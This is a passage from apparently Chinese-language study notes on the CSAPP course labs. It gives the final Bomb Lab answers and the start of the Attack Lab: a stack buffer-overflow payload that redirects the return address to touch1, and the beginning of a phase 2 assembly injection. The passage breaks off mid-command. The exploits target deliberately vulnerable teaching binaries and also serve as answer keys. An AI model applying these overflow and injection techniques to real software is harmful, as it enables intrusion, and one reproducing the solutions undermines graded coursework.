</span><span id=__span-36-2><a id=__codelineno-36-2 name=__codelineno-36-2></a><span class=p>{</span>
</span><span id=__span-36-3><a id=__codelineno-36-3 name=__codelineno-36-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=p>;</span>
</span><span id=__span-36-4><a id=__codelineno-36-4 name=__codelineno-36-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>order</span><span class=p>;</span>
</span><span id=__span-36-5><a id=__codelineno-36-5 name=__codelineno-36-5></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>node</span><span class=w> </span><span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span><span id=__span-36-6><a id=__codelineno-36-6 name=__codelineno-36-6></a><span class=p>};</span>
</span></code></pre></div></td></tr></table></div> <p>因此，phase_6的正确输入是：4 3 2 1 6 5，这样经过 7 - x 后变成 3 4 5 6 1 2，符合链表降序排列的要求（即 924 691 477 443 332 168）。</p> <p>至此，所有阶段都已成功完成：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-37-1> 1</a></span>
<span class=normal><a href=#__codelineno-37-2> 2</a></span>
<span class=normal><a href=#__codelineno-37-3> 3</a></span>
<span class=normal><a href=#__codelineno-37-4> 4</a></span>
<span class=normal><a href=#__codelineno-37-5> 5</a></span>
<span class=normal><a href=#__codelineno-37-6> 6</a></span>
<span class=normal><a href=#__codelineno-37-7> 7</a></span>
<span class=normal><a href=#__codelineno-37-8> 8</a></span>
<span class=normal><a href=#__codelineno-37-9> 9</a></span>
<span class=normal><a href=#__codelineno-37-10>10</a></span>
<span class=normal><a href=#__codelineno-37-11>11</a></span>
<span class=normal><a href=#__codelineno-37-12>12</a></span>
<span class=normal><a href=#__codelineno-37-13>13</a></span>
<span class=normal><a href=#__codelineno-37-14>14</a></span>
<span class=normal><a href=#__codelineno-37-15>15</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-37-1><a id=__codelineno-37-1 name=__codelineno-37-1></a>Linux$<span class=w> </span>./bomb<span class=w> </span>
</span><span id=__span-37-2><a id=__codelineno-37-2 name=__codelineno-37-2></a>Welcome<span class=w> </span>to<span class=w> </span>my<span class=w> </span>fiendish<span class=w> </span>little<span class=w> </span>bomb.<span class=w> </span>You<span class=w> </span>have<span class=w> </span><span class=m>6</span><span class=w> </span>phases<span class=w> </span>with
</span><span id=__span-37-3><a id=__codelineno-37-3 name=__codelineno-37-3></a>which<span class=w> </span>to<span class=w> </span>blow<span class=w> </span>yourself<span class=w> </span>up.<span class=w> </span>Have<span class=w> </span>a<span class=w> </span>nice<span class=w> </span>day!
</span><span id=__span-37-4><a id=__codelineno-37-4 name=__codelineno-37-4></a>Border<span class=w> </span>relations<span class=w> </span>with<span class=w> </span>Canada<span class=w> </span>have<span class=w> </span>never<span class=w> </span>been<span class=w> </span>better.
</span><span id=__span-37-5><a id=__codelineno-37-5 name=__codelineno-37-5></a>Phase<span class=w> </span><span class=m>1</span><span class=w> </span>defused.<span class=w> </span>How<span class=w> </span>about<span class=w> </span>the<span class=w> </span>next<span class=w> </span>one?
</span><span id=__span-37-6><a id=__codelineno-37-6 name=__codelineno-37-6></a><span class=m>1</span><span class=w> </span><span class=m>2</span><span class=w> </span><span class=m>4</span><span class=w> </span><span class=m>8</span><span class=w> </span><span class=m>16</span><span class=w> </span><span class=m>32</span>
</span><span id=__span-37-7><a id=__codelineno-37-7 name=__codelineno-37-7></a>That<span class=s1>'s number 2.  Keep going!</span>
</span><span id=__span-37-8><a id=__codelineno-37-8 name=__codelineno-37-8></a><span class=s1>0 207</span>
</span><span id=__span-37-9><a id=__codelineno-37-9 name=__codelineno-37-9></a><span class=s1>Halfway there!</span>
</span><span id=__span-37-10><a id=__codelineno-37-10 name=__codelineno-37-10></a><span class=s1>7 0</span>
</span><span id=__span-37-11><a id=__codelineno-37-11 name=__codelineno-37-11></a><span class=s1>So you got that one.  Try this one.</span>
</span><span id=__span-37-12><a id=__codelineno-37-12 name=__codelineno-37-12></a><span class=s1>9OneVg</span>
</span><span id=__span-37-13><a id=__codelineno-37-13 name=__codelineno-37-13></a><span class=s1>Good work!  On to the next...</span>
</span><span id=__span-37-14><a id=__codelineno-37-14 name=__codelineno-37-14></a><span class=s1>4 3 2 1 6 5</span>
</span><span id=__span-37-15><a id=__codelineno-37-15 name=__codelineno-37-15></a><span class=s1>Congratulations! You'</span>ve<span class=w> </span>defused<span class=w> </span>the<span class=w> </span>bomb!
</span></code></pre></div></td></tr></table></div> </li> </ol> <h2 id=attack-lab>Attack Lab<a class=headerlink href=#attack-lab title="Permanent link">¶</a></h2> <ol> <li> <p>每个文件的作用：</p> <ul> <li>ctarget: 用来做代码注入(Code injection) 攻击的程序</li> <li>rtarget: 用来做 ROP (Return-oriented programming) 攻击的程序</li> <li>cookie.txt: 一个 16 进制代码，用来作为攻击的标识符</li> <li>farm.c: 用来找寻 gadget 的源文件</li> <li>hex2raw: 用来生成攻击字符串的程序</li> </ul> <p>具体有 5 个任务，如下：</p> <table> <thead> <tr> <th>Phase</th> <th>Program</th> <th>Level</th> <th>Method</th> <th>Function</th> <th>Points</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>CTARGET</td> <td>1</td> <td>CI</td> <td>touch1</td> <td>10</td> </tr> <tr> <td>2</td> <td>CTARGET</td> <td>2</td> <td>CI</td> <td>touch2</td> <td>25</td> </tr> <tr> <td>3</td> <td>CTARGET</td> <td>3</td> <td>CI</td> <td>touch3</td> <td>25</td> </tr> <tr> <td>4</td> <td>RTARGET</td> <td>2</td> <td>ROP</td> <td>touch2</td> <td>35</td> </tr> <tr> <td>5</td> <td>RTARGET</td> <td>3</td> <td>ROP</td> <td>touch3</td> <td>5</td> </tr> </tbody> </table> </li> <li> <h3 id=phase-1_1>Phase 1<a class=headerlink href=#phase-1_1 title="Permanent link">¶</a></h3> <p>这一关中我们暂时还不需要注入新的代码，只需要让程序重定向调用某个方法就好。<code>ctarget</code> 的正常流程是:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-38-1>1</a></span>
<span class=normal><a href=#__codelineno-38-2>2</a></span>
<span class=normal><a href=#__codelineno-38-3>3</a></span>
<span class=normal><a href=#__codelineno-38-4>4</a></span>
<span class=normal><a href=#__codelineno-38-5>5</a></span>
<span class=normal><a href=#__codelineno-38-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-38-1><a id=__codelineno-38-1 name=__codelineno-38-1></a><span class=kt>void</span><span class=w> </span><span class=nf>test</span><span class=p>()</span><span class=w> </span>
</span><span id=__span-38-2><a id=__codelineno-38-2 name=__codelineno-38-2></a><span class=p>{</span>
</span><span id=__span-38-3><a id=__codelineno-38-3 name=__codelineno-38-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-38-4><a id=__codelineno-38-4 name=__codelineno-38-4></a><span class=w>    </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getbuf</span><span class=p>();</span>
</span><span id=__span-38-5><a id=__codelineno-38-5 name=__codelineno-38-5></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"NO explit.  Getbuf returned 0x%x</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>val</span><span class=p>);</span>
</span><span id=__span-38-6><a id=__codelineno-38-6 name=__codelineno-38-6></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-39-1>1</a></span>
<span class=normal><a href=#__codelineno-39-2>2</a></span>
<span class=normal><a href=#__codelineno-39-3>3</a></span>
<span class=normal><a href=#__codelineno-39-4>4</a></span>
<span class=normal><a href=#__codelineno-39-5>5</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-39-1><a id=__codelineno-39-1 name=__codelineno-39-1></a>Linux$<span class=w> </span>./ctarget<span class=w> </span>-q
</span><span id=__span-39-2><a id=__codelineno-39-2 name=__codelineno-39-2></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-39-3><a id=__codelineno-39-3 name=__codelineno-39-3></a>Type<span class=w> </span>string:abc
</span><span id=__span-39-4><a id=__codelineno-39-4 name=__codelineno-39-4></a>No<span class=w> </span>exploit.<span class=w>  </span>Getbuf<span class=w> </span>returned<span class=w> </span>0x1
</span><span id=__span-39-5><a id=__codelineno-39-5 name=__codelineno-39-5></a>Normal<span class=w> </span><span class=k>return</span>
</span></code></pre></div></td></tr></table></div> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-40-1>1</a></span>
<span class=normal><a href=#__codelineno-40-2>2</a></span>
<span class=normal><a href=#__codelineno-40-3>3</a></span>
<span class=normal><a href=#__codelineno-40-4>4</a></span>
<span class=normal><a href=#__codelineno-40-5>5</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-40-1><a id=__codelineno-40-1 name=__codelineno-40-1></a>Linux$<span class=w> </span>./ctarget<span class=w> </span>-h
</span><span id=__span-40-2><a id=__codelineno-40-2 name=__codelineno-40-2></a>Usage:<span class=w> </span><span class=o>[</span>-hq<span class=o>]</span><span class=w> </span>./ctarget<span class=w> </span>-i<span class=w> </span>&lt;infile&gt;<span class=w> </span>
</span><span id=__span-40-3><a id=__codelineno-40-3 name=__codelineno-40-3></a>-h<span class=w>          </span>Print<span class=w> </span><span class=nb>help</span><span class=w> </span>information
</span><span id=__span-40-4><a id=__codelineno-40-4 name=__codelineno-40-4></a>-q<span class=w>          </span>Don<span class=err>'</span>t<span class=w> </span>submit<span class=w> </span>result<span class=w> </span>to<span class=w> </span>server
</span><span id=__span-40-5><a id=__codelineno-40-5 name=__codelineno-40-5></a>-i<span class=w> </span>&lt;infile&gt;<span class=w> </span>Input<span class=w> </span>file
</span></code></pre></div></td></tr></table></div> <p>我们要做的是调用程序中的另一个函数 <code>touch1</code>：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-41-1>1</a></span>
<span class=normal><a href=#__codelineno-41-2>2</a></span>
<span class=normal><a href=#__codelineno-41-3>3</a></span>
<span class=normal><a href=#__codelineno-41-4>4</a></span>
<span class=normal><a href=#__codelineno-41-5>5</a></span>
<span class=normal><a href=#__codelineno-41-6>6</a></span>
<span class=normal><a href=#__codelineno-41-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-41-1><a id=__codelineno-41-1 name=__codelineno-41-1></a><span class=kt>void</span><span class=w> </span><span class=nf>touch1</span><span class=p>()</span><span class=w> </span>
</span><span id=__span-41-2><a id=__codelineno-41-2 name=__codelineno-41-2></a><span class=p>{</span>
</span><span id=__span-41-3><a id=__codelineno-41-3 name=__codelineno-41-3></a><span class=w>    </span><span class=n>vlevel</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-41-4><a id=__codelineno-41-4 name=__codelineno-41-4></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"Touch!: You called touch1()</span><span class=se>\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-41-5><a id=__codelineno-41-5 name=__codelineno-41-5></a><span class=w>    </span><span class=n>validate</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-41-6><a id=__codelineno-41-6 name=__codelineno-41-6></a><span class=w>    </span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-41-7><a id=__codelineno-41-7 name=__codelineno-41-7></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>反编译 <code>ctarget</code> 成汇编代码：<code>objdump -d ctarget &gt; ctarget.asm</code>，检索 <code>getbuf</code>，代码如下：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-42-1>1</a></span>
<span class=normal><a href=#__codelineno-42-2>2</a></span>
<span class=normal><a href=#__codelineno-42-3>3</a></span>
<span class=normal><a href=#__codelineno-42-4>4</a></span>
<span class=normal><a href=#__codelineno-42-5>5</a></span>
<span class=normal><a href=#__codelineno-42-6>6</a></span>
<span class=normal><a href=#__codelineno-42-7>7</a></span>
<span class=normal><a href=#__codelineno-42-8>8</a></span>
<span class=normal><a href=#__codelineno-42-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-42-1><a id=__codelineno-42-1 name=__codelineno-42-1></a><span class=err>00000000004017</span><span class=nf>a8</span><span class=w> </span><span class=err>&lt;</span><span class=no>getbuf</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-42-2><a id=__codelineno-42-2 name=__codelineno-42-2></a><span class=err>4017</span><span class=nl>a8:</span><span class=w> </span><span class=err>48</span><span class=w> </span><span class=err>83</span><span class=w> </span><span class=nf>ec</span><span class=w> </span><span class=mi>28</span><span class=w>             </span><span class=no>sub</span><span class=w>    </span><span class=no>$0x28</span><span class=p>,</span><span class=nv>%rsp</span>
</span><span id=__span-42-3><a id=__codelineno-42-3 name=__codelineno-42-3></a><span class=err>4017</span><span class=nl>ac:</span><span class=w> </span><span class=err>48</span><span class=w> </span><span class=err>89</span><span class=w> </span><span class=nf>e7</span><span class=w>                </span><span class=no>mov</span><span class=w>    </span><span class=nv>%rsp</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-42-4><a id=__codelineno-42-4 name=__codelineno-42-4></a><span class=err>4017</span><span class=nl>af:</span><span class=w> </span><span class=nf>e8</span><span class=w> </span><span class=mi>8</span><span class=no>c</span><span class=w> </span><span class=mi>02</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>call</span><span class=w>   </span><span class=mh>401a40</span> <span class=p>&lt;</span><span class=no>Gets</span><span class=p>&gt;</span>
</span><span id=__span-42-5><a id=__codelineno-42-5 name=__codelineno-42-5></a><span class=err>4017</span><span class=nl>b4:</span><span class=w> </span><span class=nf>b8</span><span class=w> </span><span class=mi>01</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>mov</span><span class=w>    </span><span class=no>$0x1</span><span class=p>,</span><span class=nv>%eax</span>
</span><span id=__span-42-6><a id=__codelineno-42-6 name=__codelineno-42-6></a><span class=err>4017</span><span class=nl>b9:</span><span class=w> </span><span class=err>48</span><span class=w> </span><span class=err>83</span><span class=w> </span><span class=nf>c4</span><span class=w> </span><span class=mi>28</span><span class=w>             </span><span class=no>add</span><span class=w>    </span><span class=no>$0x28</span><span class=p>,</span><span class=nv>%rsp</span>
</span><span id=__span-42-7><a id=__codelineno-42-7 name=__codelineno-42-7></a><span class=err>4017</span><span class=nl>bd:</span><span class=w> </span><span class=nf>c3</span><span class=w>                      </span><span class=no>ret</span>
</span><span id=__span-42-8><a id=__codelineno-42-8 name=__codelineno-42-8></a><span class=err>4017</span><span class=nl>be:</span><span class=w> </span><span class=err>90</span><span class=w>                      </span><span class=nf>nop</span>
</span><span id=__span-42-9><a id=__codelineno-42-9 name=__codelineno-42-9></a><span class=err>4017</span><span class=nl>bf:</span><span class=w> </span><span class=err>90</span><span class=w>                      </span><span class=nf>nop</span>
</span></code></pre></div></td></tr></table></div> <p>可以看到这里把 <code>%rsp</code> 移动了 0x28(40) 位，也就是说，我们的缓冲区有 40 位，再上面的四位就是原来正常需要返回到 test 的返回地址，我们要做的就是利用缓冲区溢出把这个返回地址改掉。</p> <p>于是我们继续搜索，来看看 touch1 在哪里：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-43-1>1</a></span>
<span class=normal><a href=#__codelineno-43-2>2</a></span>
<span class=normal><a href=#__codelineno-43-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-43-1><a id=__codelineno-43-1 name=__codelineno-43-1></a><span class=err>00000000004017</span><span class=nf>c0</span><span class=w> </span><span class=err>&lt;</span><span class=no>touch1</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-43-2><a id=__codelineno-43-2 name=__codelineno-43-2></a><span class=err>4017</span><span class=nl>c0:</span><span class=w> </span><span class=err>48</span><span class=w> </span><span class=err>83</span><span class=w> </span><span class=nf>ec</span><span class=w> </span><span class=mi>08</span><span class=w>             </span><span class=no>sub</span><span class=w>    </span><span class=no>$0x8</span><span class=p>,</span><span class=nv>%rsp</span>
</span><span id=__span-43-3><a id=__codelineno-43-3 name=__codelineno-43-3></a><span class=err>4017</span><span class=nl>c4:</span><span class=w> </span><span class=nf>c7</span><span class=w> </span><span class=mi>05</span><span class=w> </span><span class=mi>0</span><span class=no>e</span><span class=w> </span><span class=mi>2</span><span class=no>d</span><span class=w> </span><span class=mi>20</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>01</span><span class=w>    </span><span class=no>movl</span><span class=w>   </span><span class=no>$0x1</span><span class=p>,</span><span class=mi>0x202d0e</span><span class=p>(</span><span class=nv>%rip</span><span class=p>)</span><span class=w>        </span><span class=c1># 6044dc &lt;vlevel&gt;</span>
</span></code></pre></div></td></tr></table></div> <p>可以看到地址在 0x4017c0 这里，但是我们要凑够 64 位，就是 0x00000000 004017c0，于是我们需要输入的字符串就可以是这样：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-44-1>1</a></span>
<span class=normal><a href=#__codelineno-44-2>2</a></span>
<span class=normal><a href=#__codelineno-44-3>3</a></span>
<span class=normal><a href=#__codelineno-44-4>4</a></span>
<span class=normal><a href=#__codelineno-44-5>5</a></span>
<span class=normal><a href=#__codelineno-44-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-44-1><a id=__codelineno-44-1 name=__codelineno-44-1></a>00 00 00 00 00 00 00 00 
</span><span id=__span-44-2><a id=__codelineno-44-2 name=__codelineno-44-2></a>00 00 00 00 00 00 00 00 
</span><span id=__span-44-3><a id=__codelineno-44-3 name=__codelineno-44-3></a>00 00 00 00 00 00 00 00 
</span><span id=__span-44-4><a id=__codelineno-44-4 name=__codelineno-44-4></a>00 00 00 00 00 00 00 00 
</span><span id=__span-44-5><a id=__codelineno-44-5 name=__codelineno-44-5></a>00 00 00 00 00 00 00 00
</span><span id=__span-44-6><a id=__codelineno-44-6 name=__codelineno-44-6></a>c0 17 40 00 00 00 00 00
</span></code></pre></div></td></tr></table></div> <p>前四十位是啥都不重要，后面按照 little endian 的规则填上地址就好，这样就改写了属于原来的返回地址。注意可以查看到我们是 64 位系统：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-45-1>1</a></span>
<span class=normal><a href=#__codelineno-45-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-45-1><a id=__codelineno-45-1 name=__codelineno-45-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>show<span class=w> </span>architecture
</span><span id=__span-45-2><a id=__codelineno-45-2 name=__codelineno-45-2></a>The<span class=w> </span>target<span class=w> </span>architecture<span class=w> </span>is<span class=w> </span><span class=nb>set</span><span class=w> </span>to<span class=w> </span><span class=s2>"auto"</span><span class=w> </span><span class=o>(</span>currently<span class=w> </span><span class=s2>"i386:x86-64"</span><span class=o>)</span>.
</span></code></pre></div></td></tr></table></div> <p>接着我们把这个字符文件转换成字节码 <code>./hex2raw &lt; p1.txt &gt; ans1.txt</code>，最后执行一下 <code>./ctarget -q -i ans1.txt</code>，就可以看到结果了：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-46-1>1</a></span>
<span class=normal><a href=#__codelineno-46-2>2</a></span>
<span class=normal><a href=#__codelineno-46-3>3</a></span>
<span class=normal><a href=#__codelineno-46-4>4</a></span>
<span class=normal><a href=#__codelineno-46-5>5</a></span>
<span class=normal><a href=#__codelineno-46-6>6</a></span>
<span class=normal><a href=#__codelineno-46-7>7</a></span>
<span class=normal><a href=#__codelineno-46-8>8</a></span>
<span class=normal><a href=#__codelineno-46-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-46-1><a id=__codelineno-46-1 name=__codelineno-46-1></a>Linux$<span class=w> </span>./ctarget<span class=w> </span>-q<span class=w> </span>-i<span class=w> </span>ans1.txt
</span><span id=__span-46-2><a id=__codelineno-46-2 name=__codelineno-46-2></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-46-3><a id=__codelineno-46-3 name=__codelineno-46-3></a>Touch1!:<span class=w> </span>You<span class=w> </span>called<span class=w> </span>touch1<span class=o>()</span>
</span><span id=__span-46-4><a id=__codelineno-46-4 name=__codelineno-46-4></a>Valid<span class=w> </span>solution<span class=w> </span><span class=k>for</span><span class=w> </span>level<span class=w> </span><span class=m>1</span><span class=w> </span>with<span class=w> </span>target<span class=w> </span>ctarget
</span><span id=__span-46-5><a id=__codelineno-46-5 name=__codelineno-46-5></a>PASS:<span class=w> </span>Would<span class=w> </span>have<span class=w> </span>posted<span class=w> </span>the<span class=w> </span>following:
</span><span id=__span-46-6><a id=__codelineno-46-6 name=__codelineno-46-6></a><span class=w>        </span>user<span class=w> </span>id<span class=w> </span>bovik
</span><span id=__span-46-7><a id=__codelineno-46-7 name=__codelineno-46-7></a><span class=w>        </span>course<span class=w>  </span><span class=m>15213</span>-f15
</span><span id=__span-46-8><a id=__codelineno-46-8 name=__codelineno-46-8></a><span class=w>        </span>lab<span class=w>     </span>attacklab
</span><span id=__span-46-9><a id=__codelineno-46-9 name=__codelineno-46-9></a><span class=w>        </span>result<span class=w>  </span><span class=m>1</span>:PASS:0xffffffff:ctarget:1:00<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>C0<span class=w> </span><span class=m>17</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=phase-2_1>Phase 2<a class=headerlink href=#phase-2_1 title="Permanent link">¶</a></h3> <p>第二关中需要插入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 函数的 C 语言如下：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-47-1> 1</a></span>
<span class=normal><a href=#__codelineno-47-2> 2</a></span>
<span class=normal><a href=#__codelineno-47-3> 3</a></span>
<span class=normal><a href=#__codelineno-47-4> 4</a></span>
<span class=normal><a href=#__codelineno-47-5> 5</a></span>
<span class=normal><a href=#__codelineno-47-6> 6</a></span>
<span class=normal><a href=#__codelineno-47-7> 7</a></span>
<span class=normal><a href=#__codelineno-47-8> 8</a></span>
<span class=normal><a href=#__codelineno-47-9> 9</a></span>
<span class=normal><a href=#__codelineno-47-10>10</a></span>
<span class=normal><a href=#__codelineno-47-11>11</a></span>
<span class=normal><a href=#__codelineno-47-12>12</a></span>
<span class=normal><a href=#__codelineno-47-13>13</a></span>
<span class=normal><a href=#__codelineno-47-14>14</a></span>
<span class=normal><a href=#__codelineno-47-15>15</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-47-1><a id=__codelineno-47-1 name=__codelineno-47-1></a><span class=kt>void</span><span class=w> </span><span class=nf>touch2</span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=n>val</span><span class=p>)</span>
</span><span id=__span-47-2><a id=__codelineno-47-2 name=__codelineno-47-2></a><span class=p>{</span>
</span><span id=__span-47-3><a id=__codelineno-47-3 name=__codelineno-47-3></a><span class=w>    </span><span class=n>vlevel</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=p>;</span>
</span><span id=__span-47-4><a id=__codelineno-47-4 name=__codelineno-47-4></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>val</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>cookie</span><span class=p>)</span>
</span><span id=__span-47-5><a id=__codelineno-47-5 name=__codelineno-47-5></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-47-6><a id=__codelineno-47-6 name=__codelineno-47-6></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Touch2!: You called touch2(0x%.8x)</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>val</span><span class=p>);</span>
</span><span id=__span-47-7><a id=__codelineno-47-7 name=__codelineno-47-7></a><span class=w>        </span><span class=n>validate</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span><span id=__span-47-8><a id=__codelineno-47-8 name=__codelineno-47-8></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-47-9><a id=__codelineno-47-9 name=__codelineno-47-9></a><span class=w>    </span><span class=k>else</span><span class=w> </span>
</span><span id=__span-47-10><a id=__codelineno-47-10 name=__codelineno-47-10></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-47-11><a id=__codelineno-47-11 name=__codelineno-47-11></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Misfire: You called touch2(0x%.8x)</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>val</span><span class=p>);</span>
</span><span id=__span-47-12><a id=__codelineno-47-12 name=__codelineno-47-12></a><span class=w>        </span><span class=n>fail</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span><span id=__span-47-13><a id=__codelineno-47-13 name=__codelineno-47-13></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-47-14><a id=__codelineno-47-14 name=__codelineno-47-14></a><span class=w>    </span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-47-15><a id=__codelineno-47-15 name=__codelineno-47-15></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>根据代码就可以看出来，我们需要把自己的 cookie 作为参数传进去，这里需要把参数放到 <code>%rdi</code> 中，只使用 <code>ret</code> 来进行跳转。</p> <p>所以第一步，我们先来写需要注入的代码(文件 p2.s)：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-48-1>1</a></span>
<span class=normal><a href=#__codelineno-48-2>2</a></span>
<span class=normal><a href=#__codelineno-48-3>3</a></span>
<span class=normal><a href=#__codelineno-48-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-48-1><a id=__codelineno-48-1 name=__codelineno-48-1></a><span class=nf>mov</span><span class=w> </span><span class=no>$0x59b997fa</span><span class=p>,</span><span class=nv>%rdi</span><span class=w> </span><span class=c1># set my cookie as the first parameter</span>
</span><span id=__span-48-2><a id=__codelineno-48-2 name=__codelineno-48-2></a><span class=nf>push</span><span class=w> </span><span class=no>$0x4017ec</span><span class=w>       </span><span class=c1># push the address of touch2</span>
</span><span id=__span-48-3><a id=__codelineno-48-3 name=__codelineno-48-3></a><span class=nf>ret</span><span class=w> </span><span class=c1># 从栈中弹出一个地址，并跳转到该地址继续执行程序，从而实现函数调用的返回机制。</span>
</span><span id=__span-48-4><a id=__codelineno-48-4 name=__codelineno-48-4></a><span class=w>    </span><span class=c1># 即 ret == pop %rip</span>
</span></code></pre></div></td></tr></table></div> <p>这里首先把参数传入到 <code>%rdi</code> 寄存器中，然后把 <code>touch2</code> 函数的起始地址压入栈中，最后返回，这样就可以跳转到 <code>touch2</code>。然后转换成对应的机器码：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-49-1>1</a></span>
<span class=normal><a href=#__codelineno-49-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-49-1><a id=__codelineno-49-1 name=__codelineno-49-1></a>gcc<span class=w> </span>-c<span class=w> </span>p2.s
</span><span id=__span-49-2><a id=__codelineno-49-2 name=__codelineno-49-2></a>objdump<span class=w> </span>-d<span class=w> </span>p2.o<span class=w> </span>&gt;<span class=w> </span>p2.byte
